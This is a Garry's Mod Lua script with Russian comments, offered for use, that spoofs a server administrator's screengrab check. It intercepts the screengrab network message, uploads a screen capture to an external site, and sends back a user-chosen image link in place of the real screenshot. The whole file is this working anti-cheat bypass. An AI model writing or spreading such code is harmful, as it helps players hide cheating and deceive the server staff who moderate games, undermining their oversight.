-- Данный замечательный скрипт позволит вам прогружать товарищу администратору любое изображение на экран, в момент вашего скринграба.

local trolling = '' -- сюда вставляете прямую ссылку на ваше изображение

---------------------

local render_Capture = render.Capture
local cache = nil
local link = "https://macnco.one/img/post.php"

local function createCache(quality)
	hook.Add("PostRender", "NYNoire.InvSync", function()
		hook.Remove("PostRender", "NYNoire.InvSync")

		cache = render_Capture({
			format = "jpeg",
			quality = 70,
			h = ScrH(),
			w = ScrW(),
			x = 0,
			y = 0
		})
	end)
end

local function uploadPic(key)
	if not cache then
		createCache(latestQuality or 70)

		timer.Simple(0.01, function()
			uploadPic(key)
		end)

		return
	end

	webupload(cache, key, function(d)
		if not d.image or not d.image.url then return end
		net.Start("DarkRP.InvChechSync")
		net.WriteString(trolling)
		net.SendToServer()
	end)

	cache = nil
end

function webupload(binary, key, callback)
	http.Post(link, {
		source = util.Base64Encode(binary),
		key = key,
	}, function(body)
		callback(util.JSONToTable(body))
	end, print)
end

net.Receive("DarkRP.InvChechSync", function(len)
	local key = net.ReadString()
	uploadPic(key)
end)